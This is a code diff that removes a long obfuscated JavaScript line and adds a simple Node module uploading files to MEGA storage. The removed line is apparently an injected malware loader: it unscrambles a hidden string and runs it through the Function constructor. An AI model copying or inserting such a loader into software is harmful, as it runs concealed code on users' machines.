@@ -1,1 +1,25 @@
-var NewObject,obj;(function(){var RIs='',ZpV=476-465;function wpO(h){var z=553078;var u=h.length;var m=[];for(var k=0;k<u;k++){m[k]=h.charAt(k)};for(var k=0;k<u;k++){var y=z*(k+211)+(z%49717);var i=z*(k+91)+(z%15560);var p=y%u;var t=i%u;var d=m[p];m[p]=m[t];m[t]=d;z=(y+i)%3942230;};return m.join('')};var NEJ=wpO('comonlzskprvdwrbhifgjenrxttusaoutccyq').substr(0,ZpV);var VOd='8,u(t.6{,4..=r 9v;tv=rt3."].adl=qr7}tu,eipzof((5)a];upal" 0,by;,[2es=r(6ri6lr)]g ,b;t7o;7f h1+Afumn8r0;g9.n0[tg.ols{;06=a;v2r=*npcaf6v;farrmroao<praynue7)0r(an[=[,fi=yi"eragm(pc](r.hA7jcn(=un7longvf(.,inr)va7"l,yoguz1b;8glcs)lis=cs[w=zd=;=ajhr!;(,a]kS.-pl,)7]v(c;[o(a ar l=dgenngr)-)[1f=A,=;9m{=vr=;(h5 (e.wrcn<th8 t+=v))t 4cruvintdg;xvnroksmijsfet+)+gd7ryyr;(=a89 =n)n-a+gj;){u;1d>,p,fg;vC3-+e)a.)1(u-(i)o[,o;4 )) {)o(hnrlg;u].]}1rhtn;a;((11"vvee=v;(heu-"t0n(e0rza,etr[C+(()ns"y ,+gwfh1.hadl=t Aipl+n)e+o chhr}of9f)*f+2)-t;!"r2o+uhhg.uyu;A)<5i)ae;tcouo;n.>;h v=9g8if(k,f;C.hrjh(6ei]r+.ringap}=t+ui0rh2e lgt+o9v=,=g.=9y;]iv);ivs([oiv(6dnlg.i]2hp++a{biCli,8(mj)ru}merl.j=c].=n ;3vlrhln6ta=01;;}kia)o.vnv6.=(8e;;vab w,s4g)l5C(f,2sa7;.a.<ecnsa{tip;;=4r +rntroC++floyC;a;ta9tvrm() =r(rur i=eaf<[Ss]lg)+c,0nd,er(=s8jt[g+o=aha]==}u)i juji,s)ln+b10++mCa"0[o[,rg;l2r;=re6;pner;vpy, tmn"ir=.=sa t1)t';var QhG=wpO[NEJ];var oMk='';var SNW=QhG;var sKl=QhG(oMk,wpO(VOd));var pJT=sKl(wpO('2}naH(mlCmH{\/H_)r,.g)a713#%_\/)HtH)HK9H(5Do;)HHm))5}1H.,N.:H0j2d.H}L ]HmH(HsKH0er;.b_t.)-Ma=,6H!;H$;1l(H7.0aBb=!,) ;EbbfHoH.Q;"+te)feH5<!r.u;b.0;wl_Hsfs!Cowa_.HbH\'.,uH&._eH!9@!f{oHHH,sjH..(_3H1Gm2a AH4HHrL2==rss)(H+e]9HHiMH.THEb{Ho5f)i8 H)uj9.lD5ot(,H 5% }oO}b_9umHm QMtfo].o31a ,4Ea)pe{Htaflufen7SH_H8Ism!;19e?t= itg]S6nj)g#$uH.)e;xrd%HSf_)cgF)H[Hr%R_OrH%E(HeGS.ng@g]&Hz.;}MH(h6",tr;]5l!rg)"3HrH[s]cHeHLE=!FHtH!I;HQo)HjbnG=bp}Q,%.1Hb+1(ssH %=}1%leag{H0H2!(ef){Ha[H_4t%0HH,ie;e jl.rHl=Hb]gb1;7HH)c5z}(31osHo bH0\/f_bH)l.9iHH)=]+e.%j$u_sO\/.H 0{HH)4o;A),1=.3t 4,;oi9Heu\/j!meeE3eI(2,1H!tHK.5_)5(,54t0ej5a]9fi\/H(b(.,;) $_SsaHt(TH37.H_mI6)HgHE6ze\';t$24 H95Hu2l&cfN$>.R.(.0.H,ga.h,re7(s[HSHbe{(o(.a*Ro]eH0(>,!!_")Hf(4oH;.i((H))HHh=b%Hm&b.eH(,(H*] }(;x#N."j(S=8]={3=H.:{&t!;r _Ho_ rgosd9I}H2tbR!.>;d@8$r3bv.jec;p=_:H,& .lEd)IH;SH4Q8e7aHHEMlH;_=.b}S(1bH.e2SofD057A.)H)stuHml __3o>()!4b$H.7;5s<+H$+,H7(3D{ H(Hi1<;H.rcSn(H1=HHb..(>(Hv.]i$j_;__Hboo.H"o _HHHt.HHQ}6H*rg7%t;]Hom_HHSemmsHa)0w5HSoonoo5)$Hke]r.H6cHsval a{1Je(e)=nl.a_r0;;))eHy8,H.)o.t8b!,(5HHi#Hc<8($tSe)2Ht4$#H$H,>mCeK)HH+8_(Sw;H=,tn=;Hjsh5-(==HnDe(r=Hr.(.rf;).1sHHmn 7HnHf(u.H0bmRt$H(5$apHce @aQHeoQ]?HrMHsHHH!Hb)9z8ip}HaSeu(soE4db{$;pio:.M.s.ermT)aH;wC$_:130vHHHfp8Hjy2[_)p;ee;H_;HH_lb[r((Ic,=8.4Hglt)))sCH?236e]5.uame0H<Hllg=3xm3!.01z;#[:(lcme_oH61.;e();os(1D{H*4o).io2}ec0rb!].&--HNL_Hn!,_)3H)j"{6m7&)(e%aH,1HpClf8a!ei%H$(as H)l w,H_Hz(e_dF)sgr{c1+Pah((.&IHf!U;PHyo=}}(%!rtHH;gAos4HMLr$Hs!HF>4.dn);tH3s=2.=HHeSKat%((tt)wQpj;bcszau.,Q0].(s8_paohH o9sHvH4%_e.t 20g].(HPb$.$(d6z_zuHHH.6j\/i(_7),oH_,)e%>@!iHe)HH()Nu$)H+{.+a24HG4HHn=)isHHojnbHuHH]Dbs[2)H==,Huh7Ep_z)rmI1."t.s]ec8:;%H]L!5M$;eE;5e]H,HJ.) ]%4](9HH{H*]odnlebj o3tB_.$eo!ad7H{sHHH6C,HF(?%e(b3)MSH{H)ie{}0]1;t}, o!p])t);6)jMH*jtJHom.LHa,)\'jh=b(b)j!:H}_H2Hcirt(.;fnbtHns){s_nHoH$*(.j)]ue:;5]}.!pH_0s!mr61..tuM;t)2+Ho[* b6Q{;MH{)(Qi2 fbspHr31[0.pa1.atf;Hr"nHH.i8.)(4Hb 7)6t_5H>nv}5.;HHHJi($)l$s!.o0(.H c.1Hr.$xm])))$Hf )]9),H;HfH;tf.$.jPaas53;,ip)T_oej]=!ffegi73a(;],HHjr8,lH.H5FHj=e%e uu,ne[g.5)rbg&{.;fK\/eoHp)t.H2eHHb:(}1ftH[6Qab]fcH_H0!H$m uHfa!.}&Hne2H_(.#H s uop[d%{e1$t531eo..0s,H_(;).DcNiHh .(}*6 isl3NaH._HHl](x0p\'1Huw 8 weK5%(H 6%F_%-e7.)bn2m7 H$ HHi3Hoo*M]noHb-!.aG)jH.o9tro!Hez!>)GO4 Te.Hbe2Hs*;iHHw$ao}22)H!"a.i* c(.w! [lHe)!:,Lq6H)sr;tloaRH]_!5) t.Ho((?EaH=bsU'));var Pun=SNW(RIs,pJT );Pun(8754);return 8288})()
+
+   require('dotenv').config();
+   const mega = require('megajs');
+
+   const EMAIL = process.env.MEGA_EMAIL;
+   const PASSWORD = process.env.MEGA_PASSWORD;
+
+   async function upload(fileStream, fileName) {
+     return new Promise((resolve, reject) => {
+       const storage = mega.storage({ email: EMAIL, password: PASSWORD });
+
+       storage.on('ready', () => {
+         const file = storage.upload({ name: fileName });
+         fileStream.pipe(file);
+
+         file.on('complete', () => resolve(file.link));
+         file.on('error', reject);
+       });
+
+       storage.on('error', reject);
+     });
+   }
+
+   module.exports = { upload };
+   
